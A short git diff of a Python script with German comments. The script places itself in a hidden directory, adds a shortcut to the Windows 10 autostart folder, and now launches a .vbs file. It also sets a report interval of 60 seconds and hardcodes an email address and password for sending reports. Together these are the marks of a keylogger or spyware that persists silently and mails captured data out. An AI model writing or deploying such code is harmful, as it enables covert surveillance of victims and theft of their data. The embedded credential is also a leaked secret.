@@ -12,7 +12,6 @@ import os
 import sys
 
 # import für filecopy
-# from sys import argv
 from shutil import copy
 from pathlib import Path
 
@@ -43,13 +42,11 @@ if not os.path.isfile(linkfile):
     # Create shortcut to Windows 10 autostart folder
     import winshell
     from win32com.client import Dispatch
-    if ".exe" in str(sys.argv[0]):
-        f_extension = ".exe"
-    else:
-        f_extension = ".py"
+
+    f_extension = ".vbs"
 
     path = linkfile  # Path to be saved (shortcut)
-    target = hiddendir + slash + Path(__file__).stem + f_extension # The shortcut target file or folder
+    target = hiddendir + slash + Path(__file__).stem + f_extension  # The shortcut target file or folder
     work_dir = hiddendir  # The parent folder of your file
 
     # Debugging Info
@@ -63,7 +60,7 @@ if not os.path.isfile(linkfile):
     shortcut.WorkingDirectory = work_dir
     shortcut.save()
 
-###########################
+########################### - Nicht getestet!
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "masterarbeit@raikster.de"
 EMAIL_PASSWORD = "gdgse9843534geGD$fdgg&(/34sfgsgh&%§dsrgr"
